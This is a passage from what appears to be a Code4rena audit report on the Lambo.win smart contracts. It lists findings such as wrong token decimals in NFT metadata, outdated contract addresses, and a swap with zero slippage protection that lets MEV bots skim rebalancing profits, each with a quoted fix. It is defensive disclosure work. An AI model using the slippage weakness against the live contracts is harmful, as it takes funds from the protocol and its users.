called:\n\nhttps://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L189\n\nfunction\ntokenURI\n(\nuint256\ntokenId\n)\npublic\nview\noverride\n(\nERC721\n,\nIERC721Metadata\n)\nreturns\n(\nstring\nmemory\n) {\nrequire\n(\n_exists\n(\ntokenId\n));\nreturn\nINonfungibleTokenPositionDescriptor\n(\n_tokenDescriptor\n).\ntokenURI\n(\nthis\n,\ntokenId\n);\n}\n\nIt calls the\ntokenURI(INonfungiblePositionManager positionManager, uint256 tokenId)\nfunction in NonfungibleTokenPositionDescriptor.sol:\n\nhttps://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungibleTokenPositionDescriptor.sol#L48\n\nfunction\ntokenURI\n(\nINonfungiblePositionManager\npositionManager\n,\nuint256\ntokenId\n)\nexternal\nview\noverride\nreturns\n(\nstring\nmemory\n)\n{\n(, ,\naddress\ntoken0\n,\naddress\ntoken1\n,\nuint24\nfee\n,\nint24\ntickLower\n,\nint24\ntickUpper\n, , , , , ) =\npositionManager\n.\npositions\n(\ntokenId\n);\nIUniswapV3Pool\npool\n=\nIUniswapV3Pool\n(\nPoolAddress\n.\ncomputeAddress\n(\npositionManager\n.\nfactory\n(),\nPoolAddress\n.\nPoolKey\n({\ntoken0:\ntoken0\n,\ntoken1:\ntoken1\n,\nfee:\nfee\n})\n)\n);\nbool\n_flipRatio\n=\nflipRatio\n(\ntoken0\n,\ntoken1\n,\nChainId\n.\nget\n());\naddress\nquoteTokenAddress\n= !\n_flipRatio\n?\ntoken1\n:\ntoken0\n;\naddress\nbaseTokenAddress\n= !\n_flipRatio\n?\ntoken0\n:\ntoken1\n;\n(,\nint24\ntick\n, , , , , ) =\npool\n.\nslot0\n();\nreturn\n>\nNFTDescriptor\n.\nconstructTokenURI\n(\nNFTDescriptor\n.\nConstructTokenURIParams\n({\ntokenId:\ntokenId\n,\nquoteTokenAddress:\nquoteTokenAddress\n,\nbaseTokenAddress:\nbaseTokenAddress\n,\nquoteTokenSymbol:\nquoteTokenAddress\n==\nWETH9\n?\nnativeCurrencyLabel\n()\n:\nSafeERC20Namer\n.\ntokenSymbol\n(\nquoteTokenAddress\n),\nbaseTokenSymbol:\nbaseTokenAddress\n==\nWETH9\n?\nnativeCurrencyLabel\n()\n:\nSafeERC20Namer\n.\ntokenSymbol\n(\nbaseTokenAddress\n),\nquoteTokenDecimals:\nIERC20Metadata\n(\nquoteTokenAddress\n).\ndecimals\n(),\nbaseTokenDecimals:\nIERC20Metadata\n(\nbaseTokenAddress\n).\ndecimals\n(),\nflipRatio:\n_flipRatio\n,\ntickLower:\ntickLower\n,\ntickUpper:\ntickUpper\n,\ntickCurrent:\ntick\n,\ntickSpacing:\npool\n.\ntickSpacing\n(),\nfee:\nfee\n,\npoolAddress:\naddress\n(\npool\n)\n})\n);\n}\n\nThis calls the\nconstructTokenURI(ConstructTokenURIParams memory params)\nfunction:\n\nhttps://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/NFTDescriptor.sol#L44\n\nfunction\nconstructTokenURI\n(\nConstructTokenURIParams\nmemory\nparams\n)\npublic\npure\nreturns\n(\nstring\nmemory\n) {\nstring\nmemory\nname\n=\ngenerateName\n(\nparams\n,\nfeeToPercentString\n(\nparams\n.\nfee\n));\nstring\nmemory\ndescriptionPartOne\n=\ngenerateDescriptionPartOne\n(\nescapeQuotes\n(\nparams\n.\nquoteTokenSymbol\n),\nescapeQuotes\n(\nparams\n.\nbaseTokenSymbol\n),\naddressToString\n(\nparams\n.\npoolAddress\n)\n);\nstring\nmemory\ndescriptionPartTwo\n=\ngenerateDescriptionPartTwo\n(\nparams\n.\ntokenId\n.\ntoString\n(),\nescapeQuotes\n(\nparams\n.\nbaseTokenSymbol\n),\naddressToString\n(\nparams\n.\nquoteTokenAddress\n),\naddressToString\n(\nparams\n.\nbaseTokenAddress\n),\nfeeToPercentString\n(\nparams\n.\nfee\n)\n);\nstring\nmemory\nimage\n=\nBase64\n.\nencode\n(\nbytes\n(\ngenerateSVGImage\n(\nparams\n)));\nreturn\nstring\n(\nabi\n.\nencodePacked\n(\n'data:application/json;base64,'\n,\nBase64\n.\nencode\n(\nbytes\n(\nabi\n.\nencodePacked\n(\n'{\"name\":\"'\n,\nname\n,\n'\", \"description\":\"'\n,\ndescriptionPartOne\n,\ndescriptionPartTwo\n,\n'\", \"image\": \"'\n,\n'data:image/svg+xml;base64,'\n,\nimage\n,\n'\"}'\n)\n)\n)\n)\n);\n}\n\nThis calls the\ngenerateName(ConstructTokenURIParams memory params, string memory feeTier)\nfunction:\n\nhttps://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/NFTDescriptor.sol#L155\n\nfunction\ngenerateName\n(\nConstructTokenURIParams\nmemory\nparams\n,\nstring\nmemory\nfeeTier\n)\nprivate\npure\nreturns\n(\nstring\nmemory\n)\n{\nreturn\nstring\n(\nabi\n.\nencodePacked\n(\n'Uniswap - '\n,\nfeeTier\n,\n' - '\n,\nescapeQuotes\n(\nparams\n.\nquoteTokenSymbol\n),\n'/'\n,\nescapeQuotes\n(\nparams\n.\nbaseTokenSymbol\n),\n' - '\n,\ntickToDecimalString\n(\n!\nparams\n.\nflipRatio\n?\nparams\n.\ntickLower\n:\nparams\n.\ntickUpper\n,\nparams\n.\ntickSpacing\n,\nparams\n.\nbaseTokenDecimals\n,\nparams\n.\nquoteTokenDecimals\n,\nparams\n.\nflipRatio\n),\n'<>'\n,\ntickToDecimalString\n(\n!\nparams\n.\nflipRatio\n?\nparams\n.\ntickUpper\n:\nparams\n.\ntickLower\n,\nparams\n.\ntickSpacing\n,\nparams\n.\nbaseTokenDecimals\n,\nparams\n.\nquoteTokenDecimals\n,\nparams\n.\nflipRatio\n)\n)\n);\n}\n\nUltimately, in the call-chain\nadjustForDecimalPrecision()\nfunction is called:\n\nfunction\nadjustForDecimalPrecision\n(\nuint160\nsqrtRatioX96\n,\nuint8\nbaseTokenDecimals\n,\nuint8\nquoteTokenDecimals\n)\nprivate\npure\nreturns\n(\nuint256\nadjustedSqrtRatioX96\n) {\nuint256\ndifference\n=\nabs\n(\nint256\n(\nbaseTokenDecimals\n).\nsub\n(\nint256\n(\nquoteTokenDecimals\n)));\nif\n(\ndifference\n>\n0\n&&\ndifference\n<=\n18\n) {\nif\n(\nbaseTokenDecimals\n>\nquoteTokenDecimals\n) {\n>\nadjustedSqrtRatioX96\n=\nsqrtRatioX96\n.\nmul\n(\n10\n**(\ndifference\n.\ndiv\n(\n2\n)));\nif\n(\ndifference\n%\n2\n==\n1\n) {\nadjustedSqrtRatioX96\n=\nFullMath\n.\nmulDiv\n(\nadjustedSqrtRatioX96\n,\nsqrt10X128\n,\n1\n<<\n128\n);\n}\n}\nelse\n{\n>\nadjustedSqrtRatioX96\n=\nsqrtRatioX96\n.\ndiv\n(\n10\n**(\ndifference\n.\ndiv\n(\n2\n)));\nif\n(\ndifference\n%\n2\n==\n1\n) {\nadjustedSqrtRatioX96\n=\nFullMath\n.\nmulDiv\n(\nadjustedSqrtRatioX96\n,\n1\n<<\n128\n,\nsqrt10X128\n);\n}\n}\n}\nelse\n{\nadjustedSqrtRatioX96\n=\nuint256\n(\nsqrtRatioX96\n);\n}\n}\n\nAnd the\nsqrtRatioX96\nvalue (which would be around 1 as the USDC and vUSDC token amounts in the v3 pool are pegged) is adjusted with the decimal difference (which is 18-6=12 in this case); it would become either (10^12) or (1/(10^12)).\n\nThus, X would have his liquidity position NFT with incorrect or unintended v3 pool price data; X would want the v3 pool price data to be 1 but it would be something else.\n\nImpact: Correct NFT metadata is important for NFT marketplaces. Therefore the NFT functionality stands broken. The imapct is Medium.\n\nLikelihood: The likelihood is High.\n\nTherefore, the severity is Medium.\n\nIt is recommended to use the underlying token\u2019s decimals in VirtualToken.sol.\n\nFor this audit, 9 reports were submitted by wardens detailing low risk and non-critical issues. The\nreport highlighted below\nby\nBauchibred\nreceived the top score from the judge.\n\nThe following wardens also submitted reports:\ngkrastenov\n,\ninh3l\n,\nK42\n,\nPolarizedLight\n,\nprapandey031\n,\nRhaydden\n,\nSparrow\n, and\nZhengZuo999\n.\n\nTake a look at\nLaunchPadUtils.sol#L18\n:\n\naddress\npublic\nconstant\nCURVE_STABLE_NG_FACTORY\n=\n0x6A8cbed756804B16E05E741eDaBd5cB544AE21bf\n;\n\nThe protocol is using an outdated Curve StableNG Factory address. According to the\nCurve documentation\n, the correct factory address was updated in April to\n0xB9fC157394Af804a3578134A6585C0dc9cc990d4\n.\n\nAny integration with Curve pools will be broken as it\u2019s pointing to an outdated factory address. This could lead to:\n\nFailed pool deployments\nInability to interact with newer Curve pools\nIntegration failures with the Curve ecosystem\n\nHowever, considering this is not used in any in-scope contracts, the issue is QA.\n\nUpdate the\nCURVE_STABLE_NG_FACTORY\nconstant to use the latest factory address:\n\naddress\npublic\nconstant\nCURVE_STABLE_NG_FACTORY\n=\n0xB9fC157394Af804a3578134A6585C0dc9cc990d4\n;\n\nAdditionally, consider implementing a more flexible approach using Curve\u2019s AddressProvider to dynamically fetch the latest factory address instead of hardcoding it, or have an admin backed setter function to update the address.\n\nTake a look at\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/rebalance/LamboRebalanceOnUniwap.sol#L44-L57\n\nfunction\ninitialize\n(\naddress\n_multiSign\n,\naddress\n_vETH\n,\naddress\n_uniswap\n,\nuint24\n_fee\n)\npublic\ninitializer\n{\nrequire\n(\n_multiSign\n!=\naddress\n(\n0\n),\n\"Invalid _multiSign address\"\n);\nrequire\n(\n_vETH\n!=\naddress\n(\n0\n),\n\"Invalid _vETH address\"\n);\nrequire\n(\n_uniswap\n!=\naddress\n(\n0\n),\n\"Invalid _uniswap address\"\n);\n__Ownable_init\n(\n_multiSign\n);\n__ReentrancyGuard_init\n();\nfee\n=\n_fee\n;\nveth\n=\n_vETH\n;\nuniswapPool\n=\n_uniswap\n;\n}\n\nAs seen, the\nLamboRebalanceOnUniwap\ncontract is hardcoded to use a single Uniswap V3 pool with a fixed fee tier for all rebalancing operations. This design however has several critical issues:\n\nThis approach means that the contract can only access liquidity from one pool, even though Uniswap V3 supports multiple fee tiers (0.01%, 0.05%, 0.3%, 1%) for the same token pair where each fee tier represents a different pool with its own liquidity depth, so the contract misses out on potentially better liquidity in other pools.\n\nThat\u2019s to say when the chosen pool lacks sufficient liquidity,\nrebalancing attempts will always fail\nwith \u201cNo profit made\u201d\n\nfunction\nrebalance\n(\nuint256\ndirectionMask\n,\nuint256\namountIn\n,\nuint256\namountOut\n)\nexternal\nnonReentrant\n{\n// ...\nuint256\nprofit\n=\nbalanceAfter\n-\nbalanceBefore\n;\nrequire\n(\nprofit\n>\n0\n,\n\"No profit made\"\n);\n}\n\nThis stops rebalancing, and in the same sense completely bricks the core logic of peg and repeg that\u2019s been stated explicitly int he docs and the readme:\n\nPeg And Repeg\nWe will deploy liquidity on Uniswap V3, and the\n`LamboRebalanceOnUniwap`\ncontract is responsible for rebalancing the Uniswap V3 pool. The Rebalance contract utilizes the flash loan mechanism to perform arbitrage operations through MorphoVault. Specifically, the Rebalance contract executes buy or sell operations in the Uniswap V3 pool to ensure the pool's balance and gain profit through arbitrage.\n![\nDefintion\n](\nhttps://github.com/code-423n4/2024-11-lambowin/blob/main/Lambo-VirtualToken.png?raw=true\n)\nIn Uniswap V3, Lambo's LP needs to have two ranges:\n1.\nPeg Zone\n2.\nRepeg Zone\nThe Peg Zone is designed to allow low slippage exchanges between vETH and ETH. The purpose of the Repeg Zone is to create slippage, allowing the Rebalance contract to trigger timely rebalancing with profit margins to subsidize LP fees, thereby enabling cost-free flash loans.\n\nThat\u2019s to say when there is a pool with a better liquidity and the current chose one has a draw down on liquidity (which is possible as users could opt in for pools with lower fees making it gain popularity), rebalancing would be efficiently bricked due to a lack of liquidity for swaps either in Buy or Sell directions.\n\nAllow dynamic pool selection:\n\nstruct\nPoolParams\n{\naddress\npool\n;\nuint24\nfee\n;\n}\nfunction\nrebalance\n(\nuint256\ndirectionMask\n,\nuint256\namountIn\n,\nuint256\namountOut\n,\nPoolParams\ncalldata\npoolParams\n// New parameter\n)\nexternal\nnonReentrant\n{\n// Use provided pool params or fall back to default\naddress\ntargetPool\n=\npoolParams\n.\npool\n!=\naddress\n(\n0\n) ?\npoolParams\n.\npool\n:\nuniswapPool\n;\nuint24\ntargetFee\n=\npoolParams\n.\nfee\n!=\n0\n?\npoolParams\n.\nfee\n:\nfee\n;\n// ... rest of function\n}\n\nTake a look at\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/rebalance/LamboRebalanceOnUniwap.sol#L89-L107\n\nfunction\n_executeBuy\n(\nuint256\namountIn\n,\nuint256\n[]\nmemory\npools\n)\ninternal\n{\n// No minimum output amount check\nuint256\nuniswapV3AmountOut\n=\nIDexRouter\n(\nOKXRouter\n).\nuniswapV3SwapTo\n(\nuint256\n(\nuint160\n(\naddress\n(\nthis\n))),\namountIn\n,\n0\n,\n// minAmountOut set to 0\npools\n);\n}\n\nThis is the function that is used to execute the buy operation, which ends up being called from the\nrebalance()\nfunction when trying to repeg. The issue, however, is that the minimum return value has been hardcoded to 0, making it possible for users to skim off profits using MEV attacks.\n\nQA, considering if too much value is skimmed off then the attempt at rebalancing would revert\nhere\n:\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/rebalance/LamboRebalanceOnUniwap.sol#L62-L70\n\nfunction\nrebalance\n(\nuint256\ndirectionMask\n,\nuint256\namountIn\n,\nuint256\namountOut\n)\nexternal\nnonReentrant\n{\nuint256\nbalanceBefore\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\naddress\n(\nthis\n));\nbytes\nmemory\ndata\n=\nabi\n.\nencode\n(\ndirectionMask\n,\namountIn\n,\namountOut\n);\nIMorpho\n(\nmorphoVault\n).\nflashLoan\n(\nweth\n,\namountIn\n,\ndata\n);\nuint256\nbalanceAfter\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\naddress\n(\nthis\n));\nuint256\nprofit\n=\nbalanceAfter\n-\nbalanceBefore\n;\nrequire\n(\nprofit\n>\n0\n,\n\"No profit made\"\n);\n}\n\nImplement slippage protection by adding minimum output amount checks:\n\nfunction\n_executeBuy\n(\nuint256\namountIn\n,\nuint256\n[]\nmemory\npools\n,\nuint256\nminAmountOut\n)\ninternal\n{\nuint256\nuniswapV3AmountOut\n=\nIDexRouter\n(\nOKXRouter\n).\nuniswapV3SwapTo\n(\nuint256\n(\nuint160\n(\naddress\n(\nthis\n))),\namountIn\n,\nminAmountOut\n,\npools\n);\nrequire\n(\nuniswapV3AmountOut\n>=\nminAmountOut\n,\n\"Insufficient output amount\"\n);\n}\n\nTake a look at\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/rebalance/LamboRebalanceOnUniwap.sol#L62-L70\n\nfunction\nrebalance\n(\nuint256\ndirectionMask\n,\nuint256\namountIn\n,\nuint256\namountOut\n)\nexternal\nnonReentrant\n{\nuint256\nbalanceBefore\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\naddress\n(\nthis\n));\nbytes\nmemory\ndata\n=\nabi\n.\nencode\n(\ndirectionMask\n,\namountIn\n,\namountOut\n);\nIMorpho\n(\nmorphoVault\n).\nflashLoan\n(\nweth\n,\namountIn\n,\ndata\n);\nuint256\nbalanceAfter\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\naddress\n(\nthis\n));\nuint256\nprofit\n=\nbalanceAfter\n-\nbalanceBefore\n;\nrequire\n(\nprofit\n>\n0\n,\n\"No profit made\"\n);\n}\n\nThis is the function used for rebalancing, and it would revert when the amount in is\n0\nconsidering the check below in Morpho:\n\nhttps://www.contractreader.io/contract/mainnet/0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb\n\nfunction\nflashLoan\n(\naddress\ntoken\n,\nuint256\nassets\n,\nbytes\ncalldata\ndata\n)\nexternal\n{\nrequire\n(\nassets\n!=\n0\n,\nErrorsLib\n.\nZERO_ASSETS\n);\nemit\nEventsLib\n.\nFlashLoan\n(\nmsg\n.\nsender\n,\ntoken\n,\nassets\n);\nIERC20\n(\ntoken\n).\nsafeTransfer\n(\nmsg\n.\nsender\n,\nassets\n);\nIMorphoFlashLoanCallback\n(\nmsg\n.\nsender\n).\nonMorphoFlashLoan\n(\nassets\n,\ndata\n);\nIERC20\n(\ntoken\n).\nsafeTransferFrom\n(\nmsg\n.\nsender\n,\naddress\n(\nthis\n),\nassets\n);\n\nfunction rebalance(uint256 directionMask, uint256 amountIn, uint256 amountOut) external nonReentrant {\n+        require(amountIn > 0, \"Amount in must be greater than 0\");\nuint256 balanceBefore = IERC20(weth).balanceOf(address(this));\nbytes memory data = abi.encode(directionMask, amountIn, amountOut);\nIMorpho(morphoVault).flashLoan(weth, amountIn, data);\nuint256 balanceAfter = IERC20(weth).balanceOf(address(this));\nuint256 profit = balanceAfter - balanceBefore;\nrequire(profit > 0, \"No profit made\");\n}\n\nTake a look at\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/VirtualToken.sol#L72-L80\n\nfunction\ncashIn\n(\nuint256\namount\n)\nexternal\npayable\nonlyWhiteListed\n{\nif\n(\nunderlyingToken\n==\nLaunchPadUtils\n.\nNATIVE_TOKEN\n) {\nrequire\n(\nmsg\n.\nvalue\n==\namount\n,\n\"Invalid ETH amount\"\n);\n}\nelse\n{\n_transferAssetFromUser\n(\namount\n);\n}\n_mint\n(\nmsg\n.\nsender\n,\nmsg\n.\nvalue\n);\nemit\nCashIn\n(\nmsg\n.\nsender\n,\nmsg\n.\nvalue\n);\n}\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/VirtualToken.sol#L124-L130\n\nfunction\n_transferAssetFromUser\n(\nuint256\namount\n)\ninternal\n{\nif\n(\nunderlyingToken\n==\nLaunchPadUtils\n.\nNATIVE_TOKEN\n) {\nrequire\n(\nmsg\n.\nvalue\n>=\namount\n,\n\"Invalid ETH amount\"\n);\n}\nelse\n{\nIERC20\n(\nunderlyingToken\n).\nsafeTransferFrom\n(\nmsg\n.\nsender\n,\naddress\n(\nthis\n),\namount\n);\n}\n}\n\nSince the msg.value check is already present in the internal\n_transferAssetFromUser\nfunction, the\nrequire(msg.value >= amount, \"Invalid ETH amount\");\ncheck is redundant in\ncashIn\nand can be removed.\n\nRedundant code.\n\nRemove the\nrequire(msg.value >= amount, \"Invalid ETH amount\");\ncheck from the\ncashIn\nfunction.\n\nPer the docs, protocol should be able to seamlessly work on both V2 and V3, with even a hint of V4 in the abstract, see here:\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/doc/LamboV2.pdf\n\nIssue however is that provision is only made for V2 in scope, see:\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/Utils/LaunchPadUtils.sol#L24-L25\n\naddress\npublic\nconstant\nUNISWAP_ROUTER_ADDRESS\n=\n0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\n;\n\nNote that this address is the router address for V2 and not V3, making any planned calls via V3\u2019s Router unreachable.\n\nProtocol is not fully compatible with V3.\n\n-    address public constant UNISWAP_ROUTER_ADDRESS = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n+    address public constant UNISWAP_V2_ROUTER_ADDRESS = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n+    address public constant UNISWAP_V3_ROUTER_ADDRESS = 0xE592427A0AEce92De3Edee1F18E0157C05861564;//V3 router address\n\nMultiple instances in scope, for example take a look at\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/rebalance/LamboRebalanceOnUniwap.sol#L1-L9\n\n// SPDX-License-Identifier: MIT\npragma\nsolidity\n^\n0.8\n.\n20\n;\nimport\n\"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\"\n;\nimport\n\"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\"\n;\nimport\n\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"\n;\nimport\n\"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\"\n;\nimport\n\"@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol\"\n;\nimport\n\"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"\n;\n\nEvidently, the imports being done is not name specific, but this is not the best implementation because this could lead to polluting the symbol namespace.\n\nQA, albeit this could lead to the potential pollution of the symbol namespace and a slower compilation speed.\n\nConsider using import declarations of the form\nimport {<identifier_name>} from \"some/file.sol\"\nwhich avoids polluting the symbol namespace making flattened files smaller, and speeds up compilation (but does not save any gas).\n\nIn\nLamboRebalanceOnUniwap.sol\n, the variable name\nnewBalance\nis used to store what is actually a balance difference:\n\n// SlowMist [N11]\nuint256\nnewBalance\n=\naddress\n(\nthis\n).\nbalance\n-\ninitialBalance\n;\nif\n(\nnewBalance\n>\n0\n) {\nIWETH\n(\nweth\n).\ndeposit\n{value:\nnewBalance\n}();\n}\n\nThe variable name\nnewBalance\nis misleading since it represents the difference between the current and initial balance, not a new balance value. This makes the code less intuitive and could lead to confusion during code review or maintenance.\n\nLow severity.. the variable name doesn\u2019t accurately describe what it represents\n\nRename the variable to better reflect its purpose:\n\n// SlowMist [N11]\n- uint256 newBalance = address(this).balance - initialBalance;\n+ uint256 balanceDifference = address(this).balance - initialBalance;\n- if (newBalance > 0) {\n+ if (balanceDifference > 0) {\n-     IWETH(weth).deposit{value: newBalance}();\n+     IWETH(weth).deposit{value: balanceDifference}();\n}\n\nThe name\nbalanceDifference\nbetter represents that this variable stores the difference between two balance values, making the code more self-documenting and easier to understand.\n\nC4 is an open organization governed by participants in the community.\n\nC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users."
    }
  ]
}
